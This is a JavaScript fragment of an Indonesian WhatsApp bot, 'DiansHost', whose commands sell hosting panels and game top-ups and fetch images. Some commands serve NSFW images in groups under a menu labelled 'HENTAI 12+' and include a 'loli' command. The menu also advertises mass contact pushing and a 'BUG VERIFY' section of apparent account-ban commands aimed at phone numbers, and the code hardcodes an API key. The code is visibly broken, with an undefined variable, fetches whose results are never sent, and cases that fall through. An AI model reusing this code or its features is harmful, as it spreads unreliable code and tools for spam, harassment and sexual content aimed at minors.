{ title: 'PAKET G1', rowId: `${prefix}buysrv 1,${res.attributes.id}`, description: 'RAM 1GB / DISK 1GB / CPU 100%' },
{ title: 'PAKET G2', rowId: `${prefix}buysrv 2,${res.attributes.id}`, description: 'RAM 2GB / DISK 2GB / CPU 200%' },
{ title: 'PAKET G3', rowId: `${prefix}buysrv 3,${res.attributes.id}`, description: 'RAM 3GB / DISK 3GB / CPU 300%' },
{ title: 'PAKET G4', rowId: `${prefix}buysrv 4,${res.attributes.id}`, description: 'RAM 4GB / DISK 4GB / CPU 400%' },
{ title: 'PAKET G5', rowId: `${prefix}buysrv 5,${res.attributes.id}`, description: 'RAM 5GB / DISK 5GB / CPU 500%' },
{ title: 'PAKET G6', rowId: `${prefix}buysrv 6,${res.attributes.id}`, description: 'RAM 6GB / DISK 6GB / CPU 600%' },
{ title: 'PAKET G7', rowId: `${prefix}buysrv 7,${res.attributes.id}`, description: 'RAM 7GB / DISK 7GB / CPU 700%' },
{ title: 'PAKET G8', rowId: `${prefix}buysrv 8,${res.attributes.id}`, description: 'RAM 8GB / DISK 8GB / CPU 800%' },
{ title: 'PAKET G9', rowId: `${prefix}buysrv 9,${res.attributes.id}`, description: 'RAM UNLIMITED / DISK UNLIMITED / CPU UNLIMITED' }
]}]
DiansHost.sendMessage(from, { text: `*SUCCESSFULLY BUY USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n*UUID:* ${res.attributes.uuid}\n*USERNAME:* ${res.attributes.username}\n*EMAIL:* ${res.attributes.email}\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n*CREATED AT:* ${res.attributes.created_at}\n\n*Password telah dikirim ke @${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
DiansHost.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${res.attributes.email}\n*USERNAME:* ${res.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *CLIENT DiansHostPedia Team* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH`, buttonText: 'BUY SERVER', sections })
}    
        
        break
//=================================================//
 case 'apakah': 
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
DiansHost.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
	 
    break
case 'req': case 'request': {
            	if (!text) throw `Example : ${prefix + command} Fitur Min`
               let ownernya = '62895328298685@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'tesrow', buttonText: { displayText: 'MENU' }, type: 1 },{ buttonId: 'DONASI', buttonText: { displayText: 'DONASI' }, type: 1 }]
            await DiansHost.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments, quoted: m })
            let akhji = `*Request Telah Terkirim*\n*Ke Owner @${ownernya.split('@')[0]}*`
            await DiansHost.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments, quoted: m })
            }
            break  
        //hentai 18+
        break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isGroup) return m.reply(`Only Grup Banh`)
if (!isGroup) return m.reply(`Only Grup Banh`)
m.reply('proses')
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)
        break
case 'hentai-neko' :
case 'hneko' :
if (!isGroup) return m.reply(`Only Grup`)
if (!isGroup) return m.reply(`Only Grup`)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
        break
        case 'trap' :
if (!isGroup) return m.reply(`Only Grup`)
if (!isGroup) return m.reply(`Only grup`)
m.reply('proses')
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 let trapbot = [
    {buttonId: `trap`, buttonText: {displayText: `Next `}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ewe Mas`,
  buttons: trapbot,
  headerType: 1
  }     
            await DiansHost.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
    break
case 'sewa': 
m.reply(`  Hay Kak ${pushname} 
Sewa Bot ? Hubungi Admin Untuk Nego Wa.me/6285883795285 atau wa.me/6285814106861`)
        // FUNCTION DEPOSIT
   break
case 'shop': case 'list':
if (!isGroup && !isCreator) return m.reply(`Only Grup`)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'DiansHost ',
footer: `*list from ${groupName}*`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_row
}]
}
DiansHost.sendMessage(from, listMsg)   
break
case 'addlist':
        if (!isCreator) return m.reply(`Khusus ownerku`)
if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) 
if (!isGroupAdmins && !isCreator) return m.reply(`Khusus Admin Grup`)
        var get_data_respon = getDataResponList(from, chats, db_respon_list)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Berhasil menambah List menu : *${args1}*`)

break
case 'dellist':{
    if (!isCreator) return m.reply(`do grup bang`)
if (!isGroup && !isCreator) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isCreator) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: `#hapuslist ${x.key}`
})
}
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'DiansHost ',
footer: 'Silahkan pilih list yg mau dihapus',
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
DiansHost.sendMessage(from, listMsg)
}
        
        break
case 'listproduk':
case 'produk':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator by - DiansHost`
let tampilan_nya = `Hallo Kak..
Saya adalah sistem Rancangan
Dari *DiansHost*.

Berikut List produk Kami yah kak,
Jangan Lupa untuk order 
`
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: "List Produk",
sections: [{title: "[   ]",
rows: [
{title: "  YouTube", rowId: prefix+"yt", description: "YouTube Admin"},
{title: "  GroupWa", rowId: prefix+"gc", description: "Group Admin"},
{title: "  Instagram", rowId: prefix+"ig", description: "Instagram Admin"},
{title: "  Script", rowId: prefix+"sc", description: "Script bot Store & Create Panel"},
{title: "  Pembuatan Sistem", rowId: prefix+"thanksto", description: "Siapa Saja Yang Berkontribusi Di Dalam sistem Ini"}]},
{title: "[  ]",
rows: [
{title: "  Donasi", rowId: prefix+"donasi", description: "Donasi Kepada Bot"}]},
{title: "[  ]",
rows: [
{title: "  Jasa Install & Tema Panel", rowId: prefix+"ml", description: "Menampilkan List Jasa Install"},
{title: "  Script", rowId: prefix+"ff", description: "Menampilkan List Script Bot Wa"},
{title: "  Chips Domino", rowId: prefix+"domino", description: "Menampilkan List Chips Domino"},
{title: "  Panel", rowId: prefix+"buypanel", description: "Menampilkan List Sewa Panel"}]},
],
footer: footer_nya,
mentions:[botNumber, sender]})
}
        break
case 'yt':
case 'youtube':
	DiansHost.sendMessage(from, 
{text: `Jangan Lupa Subscriber yah kak
*Link* : https://youtube.com/@DiansHost`},
{quoted: m})
        break
    case 'gc':
	DiansHost.sendMessage(from, 
{text: `*Group DiansHost*\n
Group1 : https://chat.whatsapp.com/Ghme5ntaqYIFs1GS8vrryW`},
{quoted: m})
        break
case 'hapuslist':
delResponList(from, q, db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
  break
//fitur menfess// main menu
        case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				 let teksnya = `Hai kk ada Menfess nih!!\n\nDari :  _${saking}_  \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`

				 var button = [{ buttonId: `menfesconfirm`, buttonText: { displayText: `CONFIRM` }, type: 1 }, { buttonId: `sewabot`, buttonText: { displayText: `SEWABOT` }, type: 1 }]
					DiansHost.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: `DiansHost\nhttps://DiansHost.com` })
				m.reply(`Sukses Mengirim Menfess!!`)     
        break

			case 'menfesconfirm':
 				 DiansHost.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa`})
				  m.reply(`Terimakasih Menfess Telah Diterima.`)
        case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = ` *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await DiansHost.groupMetadata(i)
                     teks += ` *Nama :* ${metadata.subject}\n *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n *ID :* ${metadata.id}\n *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n *Member :* ${metadata.participants.length}\n\n\n\n`
                 }
                 DiansHost.sendTextWithMentions(m.chat, teks, m)
        }
        break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    DiansHost.sendText(m.chat, 'List Online:\n\n' + online.map(v => ' @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
  
   
                break
       break
            case 'report': case 'lapor': {
            	if (!text) throw `Example : ${prefix + command} Lapor Ada Fitur Yang error`
               let ownernya = '62895328298685@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehe', buttonText: { displayText: 'Makasih Laporannya :/' }, type: 1 }]
            await DiansHost.sendButtonText('62895328298685@s.whatsapp.net', buttons, pjtxt, nyoutube, m, {mentions: ments})
            let akhji = `Laporan Anda Telah Terkirim Ke Owner @${ownernya.split('@')[0]}\n*Terima Kasih Atas Laporannya*\n_(Nomermu Akan Terblokir Jika Laporan Hanya Di Buat Buat)_`
            await DiansHost.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            }
        break
case 'push':{
lrm = `${kini}
     

  CREATOR : DiansHost
  RUNING ON : PANEL ONLY
  OWNER NOMOR: 62895328298685

  TUTORIAL PUSH KONTK 
 pushkontak <text> 
 
  yt owner https://youtube.com/@DiansHostoffcc
  CREDIT : ZiroyHost

  
`
let buttons00 = [
{buttonId: '#pushkontak SAVE Bie ', buttonText: {displayText: ' PUSHKONTAK'}, type: 2},

  ]
  
  let buttonMessage00 = {
      text: lrm,
      footer: 'Dians Hosting',
      buttons: buttons00,
      headerType: 00
  }
DiansHost.sendMessage(from, buttonMessage00, {quoted: m})
}
      
       ///top up
        break
case 'ff':{
   const sections = [
    {
	title: "Free Fire",
	rows: [
	   {
	    title: "5 Diamonds", 
	    rowId: `${prefix}proses2`,
	   },	    
     ]
    },
    {
	title: "Free Fire",
	rows: [
	   {
	    title: "12 Diamonds", 
	    rowId: `${prefix}proses2`,
	   },	    
     ]
    },
    {
	title: "Free Fire",
	rows: [
	   {
	    title: "50 Diamonds", 
	    rowId: `${prefix}proses2`,
	   },	    
     ]
    },
    {
	title: "Free Fire",
	rows: [
	   {
	    title: "70 Diamonds", 
	    rowId: `${prefix}proses2`,
	   },	    
     ]
    },
    {
	title: "Free Fire",
	rows: [
	   {
	    title: "140 Diamonds", 
	    rowId: `${prefix}proses2`,
	   },	    
     ]
    },
    {
	title: "Free Fire",
	rows: [
	   {
	    title: "355 Diamonds", 
	    rowId: `${prefix}proses2`,
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname}_*\n*_Ini List Harga Diamond Free Fire_*`,
   footer: "DiansHost",
   title: "",
   buttonText: "Cek Harga !!",
   sections
   }

  DiansHost.sendMessage(m.chat, listMessage, {quoted:m})


}
      break

case 'script': case 'sc':{
let text_sc =`${pushname}*\n`
text_sc += "*SCRIPT NO ENC*\n"
text_sc += "Mau beli scriptnya?\n\n"
text_sc += "*Contact Person *\n"
text_sc += "https://wa.me/62895328298685\n\n"
text_sc += "*Pembayaran Via* \n"
text_sc += "_Qris / Dana / Gopay_\n\n"
text_sc += "*Harga : Rp15.000 (15k)*\n"
text_sc += "*Harga terlalu mahal?*\n"
text_sc += "*Sans nego dikit gpp*\n\n"
text_sc += "Sudah termasuk tutorial.\n"
text_sc += "Size script sudah ringan.\n"
text_sc += "Anti ngelag/delay."
m.reply(text_sc)
}
        
        break
case 'isi':{
lrm = `${kini}
             DiansHost
     
user:
nomor:
ram:
contoh : ram,namamu,62xxx
`
let buttons00 = [
{buttonId: '#proses', buttonText: {displayText: 'SUDAH DI ISI KAK'}, type: 2},

  ]
  
  let buttonMessage00 = {
      text: lrm,
      footer: 'Dians Hosting',
      buttons: buttons00,
      headerType: 00
  }
DiansHost.sendMessage(from, buttonMessage00, {quoted: m})
}
      
        break
// INI FITUR STORE GAME YA JING //
case 'proses2': {
min = `         s \n\n  s   \n\nTerima Kasih.`
let buttons = [{ buttonId: `owner`, buttonText: {displayText: 's '}, type: 1},{buttonId: `payment`, buttonText: {displayText: ''}, type: 1}]
            await DiansHost.sendButtonText(m.chat, buttons, min, quoted, m)
}
        break
case 'allmenu':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let tampilan_nya = `*BERIKUT ADALAH ALL MENU*
*YANG DI BUAT OLEH DiansHost*`
DiansHost.sendMessage(from,
{text: tampilan_nya,
buttonText: "Dians Hosting",
sections: [{title: "DiansHost",
rows: [
{title: " LIST PRODUK", rowId: prefix+"listproduk", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: " MENU STORE", rowId: prefix+"storemenu", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: " LIST SCRIPIT ", rowId: prefix+"listscripit", description: "KLIK UNTUK MANAMPILAKAN YAH"},
{title: " LIST PANEL BOT", rowId: prefix+"buypanel", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: "  LIST JASA INSTALL SERVER PANEL", rowId: prefix+"listinstalsrv", description: "KLIK UNTUK MENAMPILKAN YAH "},
{title: " LIST SEWA BOT", rowId: prefix+"listsewa", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: " MENU PANEL", rowId: prefix+"panelmenu", description: "KLIK UNTUK MENAMPILKAN YAH"},
    {title: " MAIN MENU", rowId: prefix+"mainmenu", description: "KLIN UNTUK MENAMPILKAN YAH"},
{title: "  MENU DOMAIN", rowId: prefix+"domain", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: " MENU OWNER", rowId: prefix+"ownermenu", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: " MENU GROUP", rowId: prefix+"groupmenu", description: "KLIK UNTUK MENAMPILAKAN YAH"},
    {title: " ADMIN (DiansHost)", rowId: prefix+"owner", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: " BUG VERIFY MENU", rowId: prefix+"bugverify", description: "KLIK UNTUK MENAMPILKAN YAH"},
{title: "  PAYMENT", rowId: prefix+"pay", description: "KLIK UNTUK MENAMPILKAN YAH"}]},
],
footer: 'DiansHost',
mentions:[global.author, sender]})
}
        //bug
break
case 'waifu':
    case 'loli':
    case 'husbu':
    case 'milf':
    case 'cosplay':
    case 'wallml':
    m.reply('proses')
          let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
          let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
          DiansHost.sendMessage(m.chat, { image: { url: wipi }, caption: `${command}` }, { quoted: m })
    
        break

case 'sourcecode':{
let teks = `*----------- Thanks To -----------*
*- DiansHost ( Base Dan Creator )*
*- ${owner} ( Owner )*
*- Adiwajshing ( Baileys )*`
m.reply(teks)
}
       
// Casenya
      break
case 'menu':{ 
    m.reply(`Menu Akan Muncul Mohon Jangan Spam`) 
DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption: `${kini}
[ *INFO USER* ] 
○ .Name : ${pushname}
○ .Number : ${m.sender.split('@')[0]}
○ .Status : ${isCreator ? "Owner 👑":"User "}
○ .Status : ${isSeler ? "PREMIUM 👑":"GRATISAN"}
○ .Limit : ${isCreator ? "Unlimited 👑" :""}

┌⁠────[ *INFO BOT* ] 
○ .ᴄʀᴇᴀᴛᴏʀ : DiansHost
○ .ɴᴀᴍᴇ ʙᴏᴛ: META-BOTZ⚡
○ .ʙᴏᴛ ᴠᴇʀꜱɪᴏɴ: v12
○ .runtime :${runtime(process.uptime())} 
○ .Total Pengguna Premium :  ${owner.length}
○ .Mode : ${DiansHost.public ? 'Public-Mode ' : 'Self-Mode '}
○ .grup : https://chat.whatsapp.com/Ghme5ntaqYIFs1GS8vrryW

┌⁠────[ 𝗙𝗜𝗧𝗨𝗥_𝗔𝗡𝗜𝗠𝗘 ] 
○ .waifu ( random )
○ .loli (random ) 
○ .husbu ( random ) 
○ .cosplay ( random ) 
○ .kiss ( random ) 
○ .ppcp ( ppcouple )
○ .neko ( random ) 
└──────────

┌⁠────[ 𝗛𝗘𝗡𝗧𝗔𝗜 𝟭𝟮+ ]
○ .nwaifu ( +18 ) 
○ .hneko ( +18 ) 
○ .milf ( +18 )  
○ .trap ( +18 )  
└──────────
┌⁠───────────────────
○ .JAM DI INDONESIA🇮🇩
○ .Hari Ini : Monday, 03 July 2023
○ .Tanggal : 03/07/23 
○ .WIB : 19 : 15 : 16
○ .WIT : 21 : 15 : 16
○ .WITA : 20 : 15 : 16
└────────────────
┌⁠────[ 𝗚𝗥𝗨𝗣 𝗠𝗘𝗡𝗨 ]
○ .hidetag ( untuk tag member }
○ .kick ( kick member }  
○ .antilink ( auto kick linkgc ) 
○ .lgc ( link group  }   
○ .resetlink ( reset linkgc }
○ .promote ( jadikan admin }
○ .demote (  berhenti jadi admin }   
○ .welcome ( untuk mengaktifkan welcome }
○ .tagall ( tag smua mem  }
○ .setdesc ( untuk mengganti deskripsi }
○ .setnama ( untuk mengganti nama group } 
○ .id ( id group }
○ .group ( open/close }
○ .sendgc ( send grup ke nomor tersebut }
○ .daftar ( untuk daftar resler }
○ .listgroup ( melihat smua group )
○ .peraturan ( peraturan group }
└──────────
┌⁠────[ *DEPO* 𝗠𝗘𝗡𝗨 ] 
○ .deposit/depo 
○ .buyakn 
○ .buysrv 
○ .buyadmin 
└──────────
┌⁠────[ *HARAM MENU* ]] 
○ .videoviral1 
○ .videoviral2
○ .videoviral3
○ .videoviral4
└──────────
┌⁠────[ 𝗦𝗧𝗜𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 ]  
○ .sticker/s
○ .qc <text>
○ .emojimix 🤩 + 😱
○ .emojimix2 🤩
└──────────
┌⁠────[ *RANDOM CECAN* ] 
○ .randomcecan1 ( random )
○ .randomcecan2 (random ) 
○ .randomcecan3 ( random ) 
○ .randomcecan4 ( random ) 
○ .randomcecan5 ( random ) 
○ .randomcecan6 ( random )
○ .randomcecan7 ( random ) 
○ .randomcecan8 ( random )
○ .randomcecan9 ( random )
○ .randomcecan10 ( random )
└──────────
┌⁠────[ *RANDOM LOGO ] 
○ .logo1 ( random }
○ .logo2 ( random }  
○ .logo3 ( random ) 
○ .logo4 ( random  }   
○ .logo5 ( random }
○ .Logo6 ( random }
○ .Logo7 (  random }   
○ .logo8  ( random }
○ .logo9 ( random  }
○ .logo10 ( random }
○ .logo11 ( random } 
○ .logo11 ( random }
○ .logo12 ( random }
○ .logo13 ( random }
○ .logo14 ( random }
○ .logo15 ( random )
○ .logo16 ( random }
○ .logo17 ( random }
○ .logo18 ( random }
○ .logo19 ( random }
○ .logo20 ( random }
○ .logo21 ( random }
○ .logo22 ( random }
○ .logo23 ( random }
○ .logo24 ( random }
○ .logo24 ( random }
○ .logo25 ( random }
○ .logo26 ( random }
○ .logo27 ( random }
○ .logo28 ( random }
○ .logo29 ( random }
○ .logo30 ( random }
└──────────
┌⁠────[ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ] 
○ .addgc ( di grup )
○ .delgc ( di grup )
○ .restseler ( Restar seler )
○ .listseler ( melihat smua seler )
○ .add ( nomor/tag )
○ .del ( nomor/tag )
○ .pushkontak ( teks )
○ .setppbot ( mengganti pp bot )
○ .listonline ( online )
○ .listoc ( list personal )
○ .creategroup ( membuat group )
○ .self ( bot mode seleb 🗿 )
○ .public ( bot mode janda 🗿 )
○ .pushmember
○ .pushmember2
└──────────
┌⁠────[ 𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 ] 
○ .addusr 
○ .addusr2
○ .addusr_ram
○ .crateadmin
○ .addsrv 
○ .detusr
○ .detsrv
○ .delusr
○ .delsrv
○ .ramlist
○ .infopanel
○ .webpanel
└──────────
┌⁠────[ 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗠𝗘𝗡𝗨 ]
○ .1gb username,628xxx
○ .2gb username,628xxx
○ .3gb username,628xxx
○ .4g  username,628xxx
○ .5gb username,628xxx
○ .6gb username,628xxx
○ .7gb username,628xxx
○ .8gb username,628xxx
○ .unli username,628xxx
└──────────
┌⁠────[ 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨 ] 
○ .addlist 
○ .dellist
○ .list/shop
○ .listproduk
○ .proses 
○ .done
└──────────
┌⁠────[ *MAIN* 𝗠𝗘𝗡𝗨 ] 
○ .kopi/coffe 
○ .pin <text>
○ .couple 
○ .apakah <text>
○ .bagaimanakah <text>
○ .assalamualaikum
○ .confes <text>
○ .google <text>
○ .req <text>
○ .tourl
○ .tt <link>
○ .menu2
○ .ytmp3 <link>
○ .ytmp4 <link>
○ .ai/openai
○ .img/imgai
○ .buyprem
○ .cekmyprem
└──────────
┌⁠────[ *SOSMED* ] 
○ .yt ( yutub admin )
○ .ig ( instragam admin )
○ .owner ( whatsap admin )
○ .tiktok ( tiktok admin )
└──────────
 ┌⁠────[ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗠𝗘𝗡𝗨 ] 
○ .verify ( 62xxx/@ )
○ .banned ( 62xxx/@ )
○ .logout ( 62xxx/@ )
○ .kenon  ( 62xxx/@ )
└──────────
┌⁠────[ *PAYMENT* 𝗠𝗘𝗡𝗨 ] 
○ .dana 
○ .qris
○ .donasi
└──────────
  ━━━━━━━━━━━━━━━━━━━
┃SUBSCRIBE YT DiansHost┃
  ━━━━━━━━━━━━━━━━━━━
             _________uu$$$$$$$$$$$$$$$$$uu__________
_________u$$$$$$$$$$$$$$$$$$$$$u_________
________u$$$$$$$$$$$$$$$$$$$$$$$u________
_______u$$$$$$$$$$$$$$$$$$$$$$$$$u_______
_______u$$$$$$$$$$$$$$$$$$$$$$$$$u_______
_______u$$$$$$”___”$$$”___”$$$$$$u________
_______”$$$$”______u$u_______$$$$”________
________$$$———u$u_______u$$$________
________$$$u______u$$$u______u$$$________
_________”$$$$uu$$$___$$$uu$$$$”_________
__________”$$$$$$$”___”$$$$$$$”__________
____________u$$$$$$$u$$$$$$$u____________
_____________u$”$”$”$”$”$”$u______________
__uuu________$$u$_$_$_$_$u$$_______uuu__
_u$$$$________$$$$$u$u$u$$$_______u$$$$_
__$$$$$uu______”$$$$$$$$$”_____uu$$$$$$__
u$$$$$$$$$$$uu____”"”"”____uuuu$$$$$$$$$$
$$$$”"”$$$$$$$$$$uuu___uu$$$$$$$$$”"”$$$”
_”"”______”"$$$$$$$$$$$uu_”"$”"”___________
___________uuuu_”"$$$$$$$$$$uuu___________
__u$$$uuu$$$$$$$$$uu_”"$$$$$$$$$$$uuu$$$__
__$$$$$$$$$$”"”"___________”"$$$$$$$$$$$”__
___”$$$$$”______________________”"$$$$”"__
` }, { quoted: m })
}
    break
        case 'DiansHost': {
        var menump3 = fs.readFileSync('./DiansHost.mp3')
        await DiansHost.sendMessage(m.chat,{audio:menump3,
                                       mimetype: 'audio/mpeg',ptt:true},
                               {quoted})}
        

                
            
                          
        break
        case 'tagmenu': {
			 let tagg = [
                {
                title: "Tag Menu",
                rows: [
                {title: "Si Tag Sendiri", rowId: `tagme`, description: `Malah tag sendiri lol:v`},
				{title: "Si Paling Beban", rowId: `bebangrup`, description: `Siapa yg beban disini ya??`},
				{title: "Si Babi di Grup", rowId: `babigrup`, description: `Tes kebaperan yuk awokawok:v`},
				{title: "Si Paling Keren", rowId: `kerengrup`, description: `Anjayyy keren sekali orang ini`},
				{title: "Si Paling Pinter", rowId: `pintargrup`, description: `Belajarlah dari orang ini`},
				{title: "Si Paling Wibu", rowId: `wibugrup`, description: `Anjay wibu `},
				{title: "Si Cantik bak Bidadari", rowId: `cantikgrup`, description: `Wow cantik sekali org ini`},
				{title: "Si Ganteng bak tuan Putra", rowId: `gantenggrup`, description: `Ganteng sekaliii tuan putra ini :D`},
				]
				},
				]
	   		    DiansHost.sendListMsg(m.chat, `*Menu tag seseorang yg si paling...*`, ntiktok, `TAG MENU`, `Touch Me ()`, tagg, floc)
				 }
				break
        case 'tiktok': {
               if (args.length < 1) return m.reply(`Gunakan Format : ${command} https://vt.tiktok.com/ZS8HAjYq9/`)
               if (!isUrl(args[0]) && !args[0].includes('vt.tiktok') && !args[0].includes('tiktok.com')) return m.reply('Maaf Link Tidak Valid')
               m.reply(`_Tunggu Sebentar..._`)
               a = await require('../js/lib/tiktok')(args[0])
               try {
               texp = `*Nickname :* ${a.autor.nickname}\n*Username :* ${a.autor.username}\n*Comment :* ${a.details.comment_count}\n*Share :* ${a.details.share_count}\n*Like :* ${a.details.like_count}\n*Description :* ${a.details.desc}`
               DiansHost.sendVideo(m.chat, a.download.video.no_wm.url, texp, m)
               } catch (err) {
               console.log(err)
               await DiansHost.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: ' Maaf, Data tidak ditemukan'}, { quoted: m })
               }
}
        break
case 'emojimix': {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} +`
if (!emoji2) throw `Example : ${prefix + command} +`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await DiansHost.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
        break
case 'antilink':{
if (!isGroup) return m.reply(`Khusu Grup Bodoh`)
if (!isGroupAdmins) return m.reply(`Lu Siapa Anj Ini Khusus Admin Grup`)
if (!isBotGroupAdmins) return m.reply(`Bot Bukan Admin banh`)
if (!args[0]) return m.reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return m.reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return m.reply('Antilink belum aktif')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply('Successfully Disabling Antilink In This Group')
} else { m.reply('Kata kunci tidak ditemukan!') }
}
        case "creategc":{
if (!isCreator) return m.reply('khusus own')
if (!text) return m.reply("Nama groupnya?")
let cret = await DiansHost.groupCreate(text, [])
let response = await DiansHost.groupInviteCode(cret.id)
